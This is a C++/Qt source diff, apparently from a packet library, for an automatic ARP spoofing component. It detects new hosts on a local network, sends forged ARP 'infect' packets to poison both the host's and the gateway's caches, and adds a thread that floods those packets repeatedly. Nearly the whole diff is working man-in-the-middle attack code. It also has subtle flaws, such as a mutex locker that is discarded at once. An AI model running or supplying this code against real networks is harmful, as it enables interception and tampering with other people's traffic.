@@ -47,6 +47,54 @@ bool GAutoArpSpoof::doClose() {
 	return GArpSpoof::doClose();
 }
 
+void GAutoArpSpoof::processPacket(GPacket* packet) {
+	GMac mac;
+	GIp ip;
+
+	bool attack = false;
+	if (checkIp_ && processIp(packet, &mac, &ip))
+		attack = true;
+	if (checkArp_ && processArp(packet, &mac, &ip))
+		attack = true;
+	if (checkDhcp_ && processDhcp(packet, &mac, &ip))
+		attack = true;
+	if (!attack) return;
+
+	if (ip == myIp_ || ip == gwIp_) return;
+	if (mac == myMac_ || mac == gwMac_) return;
+
+	GFlow::IpFlowKey ipFlowKey(ip, gwIp_);
+	if (flowMap_.find(ipFlowKey) != flowMap_.end()) return;
+
+	Flow flow(ip, mac, gwIp_, gwMac_);
+	flow.makePacket(&flow.infectPacket_, myMac_, true);
+	flow.makePacket(&flow.recoverPacket_, myMac_, false);
+
+	qDebug() << QString("new host(%1 %2) detected").arg(QString(mac), QString(ip));
+
+	flowMap_.insert(ipFlowKey, flow);
+	flowList_.push_back(flow);
+	sendArpInfect(&flow);
+
+	GFlow::IpFlowKey revIpFlowKey(gwIp_, ip);
+	Flow revFlow(gwIp_, gwMac_, ip, mac);
+	revFlow.makePacket(&revFlow.infectPacket_, myMac_, true);
+	revFlow.makePacket(&revFlow.recoverPacket_, myMac_, false);
+
+	flowMap_.insert(revIpFlowKey, revFlow);
+	{
+		QMutexLocker(&flowList_.m_);
+		flowList_.push_back(revFlow);
+	}
+	sendArpInfect(&revFlow);
+	if (floodingInterval_ != 0) {
+		FloodingThread* thread = new FloodingThread(this, &flow.infectPacket_, &revFlow.infectPacket_);
+		QObject::connect(thread, &QThread::finished, thread, &QObject::deleteLater);
+		this->moveToThread(thread);
+		thread->start();
+	}
+}
+
 bool GAutoArpSpoof::processIp(GPacket* packet, GMac* mac, GIp* ip) {
 	GEthHdr* ethHdr = packet->ethHdr_;
 	if (ethHdr == nullptr) return false;
@@ -103,44 +151,34 @@ bool GAutoArpSpoof::processDhcp(GPacket* packet, GMac* mac, GIp* ip) {
 	return false;
 }
 
-void GAutoArpSpoof::processPacket(GPacket* packet) {
-	GMac mac;
-	GIp ip;
+GAutoArpSpoof::FloodingThread::FloodingThread(GAutoArpSpoof* parent, GEthArpHdr* infectPacket1, GEthArpHdr* infectPacket2) : QThread(parent) {
+	GDEBUG_CTOR
+	parent_ = parent;
+	infectPacket_[0] = * infectPacket1;
+	infectPacket_[1] = * infectPacket2;
+}
 
-	bool attack = false;
-	if (checkIp_ && processIp(packet, &mac, &ip))
-		attack = true;
-	if (checkArp_ && processArp(packet, &mac, &ip))
-		attack = true;
-	if (checkDhcp_ && processDhcp(packet, &mac, &ip))
-		attack = true;
-	if (!attack) return;
+GAutoArpSpoof::FloodingThread::~FloodingThread() {
+	GDEBUG_DTOR
+}
 
-	if (ip == myIp_ || ip == gwIp_) return;
-	if (mac == myMac_ || mac == gwMac_) return;
-
-	GFlow::IpFlowKey ipFlowKey(ip, gwIp_);
-	if (flowMap_.find(ipFlowKey) != flowMap_.end()) return;
-
-	Flow flow(ip, mac, gwIp_, gwMac_);
-	flow.makePacket(&flow.infectPacket_, myMac_, true);
-	flow.makePacket(&flow.recoverPacket_, myMac_, false);
-
-	qDebug() << QString("new host(%1 %2) detected").arg(QString(mac), QString(ip));
-
-	flowMap_.insert(ipFlowKey, flow);
-	flowList_.push_back(flow);
-	sendArpInfect(&flow);
-
-	GFlow::IpFlowKey revIpFlowKey(gwIp_, ip);
-	Flow revFlow(gwIp_, gwMac_, ip, mac);
-	revFlow.makePacket(&revFlow.infectPacket_, myMac_, true);
-	revFlow.makePacket(&revFlow.recoverPacket_, myMac_, false);
-
-	flowMap_.insert(revIpFlowKey, revFlow);
-	{
-		QMutexLocker(&flowList_.m_);
-		flowList_.push_back(revFlow);
+void GAutoArpSpoof::FloodingThread::run() {
+	qDebug() << "beg";
+	QElapsedTimer timer;
+	timer.start();
+	while (true) {
+		qint64 elapsed = timer.elapsed();
+		if (elapsed > qint64(parent_->floodingInterval_)) break;
+		for (int i = 0; i < 2; i++) {
+			GBuf buf(pbyte(&infectPacket_[i]), sizeof(GEthArpHdr));
+			parent_->write(buf);
+			QThread::msleep(parent_->sendInterval_);
+		}
+		QThread::msleep(parent_->floodingSendInterval_);
 	}
-	sendArpInfect(&revFlow);
+	qDebug() << "end";
+}
+
+void GAutoArpSpoof::myDeleteLater() {
+	qDebug() << "myDeleteLater()";
 }
